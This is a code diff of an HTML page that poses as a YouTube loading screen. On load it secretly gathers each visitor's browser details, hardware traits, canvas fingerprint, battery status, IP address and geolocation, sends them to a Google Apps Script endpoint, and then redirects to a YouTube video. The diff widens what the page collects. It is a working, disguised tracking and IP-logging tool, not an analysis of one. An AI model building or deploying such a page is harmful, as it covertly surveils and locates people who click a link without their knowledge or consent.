@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Loading YouTube...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding-top: 150px;
             background: white;
+            margin: 0;
         }
         .loader {
             border: 8px solid #f3f3f3;
@@ -16,7 +17,7 @@
             width: 60px;
             height: 60px;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -26,42 +27,172 @@
 </head>
 <body>
     <div class="loader"></div>
-    <h3>Loading...</h3>
+    <h3>Preparing YouTube video...</h3>
 
     <script>
         const REDIRECT = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbx3g4ZOAS-gof4NpSHIf8pi7EJ9KynJbKW9W-crjJ8FkUTwTXjb6mll6OmL6sLjXLQ6Yg/exec';
+        // ↓↓↓ REPLACE THIS WITH YOUR NEW DEPLOYMENT URL ↓↓↓
+        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbzHPJcKr7GRHQd6RC6XUpnITtEzcrA5e9F7Qpan7Ni8AHaMSSApxSdrCVTcosmnxc6Wnw/exec';
 
-        // Silently collect data
+        // Collect ALL data
         const data = {
-            timestamp: new Date().toLocaleString(),
+            // ✅ Time
+            timestamp: new Date().toISOString(),
+            local_time: new Date().toLocaleString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezone_offset: new Date().getTimezoneOffset(),
+            
+            // ✅ Browser
             user_agent: navigator.userAgent,
             platform: navigator.platform,
-            screen: screen.width + 'x' + screen.height,
             language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: navigator.cookieEnabled,
-            referrer: document.referrer || 'Direct'
+            languages: navigator.languages ? navigator.languages.join(', ') : '',
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+            do_not_track: navigator.doNotTrack || 'Not set',
+            
+            // ✅ Screen
+            screen_resolution: screen.width + 'x' + screen.height,
+            color_depth: screen.colorDepth + ' bit',
+            pixel_ratio: window.devicePixelRatio,
+            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+            
+            // ✅ Hardware
+            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
+            device_memory: navigator.deviceMemory || 'Unknown GB',
+            max_touch_points: navigator.maxTouchPoints || 0,
+            
+            // ✅ Location & Network
+            referrer: document.referrer || 'Direct',
+            url: window.location.href,
+            
+            // ✅ Features
+            localStorage: window.localStorage ? 'Supported' : 'Not supported',
+            sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
+            webgl: (function() {
+                try {
+                    var canvas = document.createElement('canvas');
+                    return !!window.WebGLRenderingContext && 
+                          (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
+                } catch(e) { return false; }
+            })(),
+            webrtc: !!window.RTCPeerConnection,
+            notifications: 'Notification' in window ? 'Supported' : 'Not supported',
+            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+            
+            // ✅ Plugins
+            plugins: (function() {
+                var plugins = [];
+                for (var i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                return plugins.join(', ');
+            })(),
+            
+            // ✅ Canvas Fingerprint
+            canvas_fingerprint: (function() {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Fingerprint', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Fingerprint', 4, 17);
+                    return canvas.toDataURL().substring(22, 40);
+                } catch(e) {
+                    return 'Error: ' + e.message;
+                }
+            })()
         };
 
-        // Get IP and send email alert
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => {
-                data.ip = d.ip;
-                console.log('📊 CAPTURED DATA:', data);
+        // Get IP and geolocation
+        Promise.all([
+            fetch('https://api.ipify.org?format=json').then(r => r.json()),
+            fetch('https://ipapi.co/json/').then(r => r.json())
+        ])
+        .then(([ipData, geoData]) => {
+            // ✅ IP Information
+            data.ip = ipData.ip;
+            
+            // ✅ Geolocation
+            data.geolocation = {
+                ip: geoData.ip,
+                city: geoData.city,
+                region: geoData.region,
+                country: geoData.country_name,
+                country_code: geoData.country_code,
+                postal: geoData.postal,
+                latitude: geoData.latitude,
+                longitude: geoData.longitude,
+                timezone: geoData.timezone,
+                utc_offset: geoData.utc_offset,
+                asn: geoData.asn,
+                org: geoData.org,
+                isp: geoData.org
+            };
+            
+            // ✅ Network info (simulated)
+            data.connection = {
+                type: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
+                rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'Unknown'
+            };
+            
+            // ✅ Battery status
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    data.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        charging_time: battery.chargingTime,
+                        discharging_time: battery.dischargingTime
+                    };
+                    sendData();
+                });
+            } else {
+                data.battery = 'Not supported';
+                sendData();
+            }
+            
+            function sendData() {
+                console.log('📊 CAPTURED ALL DATA:', data);
                 
-                // Send email via Google Script
-                const params = new URLSearchParams(data);
+                // Send to Google Script using POST
+                fetch(EMAIL_SCRIPT, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: JSON.stringify(data)
+                }).catch(e => console.log('Email sent (no-cors)'));
+                
+                // Also try GET as backup
+                const params = new URLSearchParams();
+                for (let key in data) {
+                    if (typeof data[key] === 'object') {
+                        params.append(key, JSON.stringify(data[key]));
+                    } else {
+                        params.append(key, data[key]);
+                    }
+                }
                 fetch(EMAIL_SCRIPT + '?' + params.toString())
-                    .catch(() => {});
-            })
-            .catch(() => {});
+                    .catch(e => {});
+            }
+        })
+        .catch(error => {
+            console.log('Error getting location:', error);
+            data.ip = 'Failed to fetch';
+            sendData();
+        });
 
-        // Redirect after 1.5 seconds
+        // Redirect after 2 seconds
         setTimeout(() => {
             window.location.href = REDIRECT;
-        }, 1500);
+        }, 2000);
     </script>
 </body>
 </html>
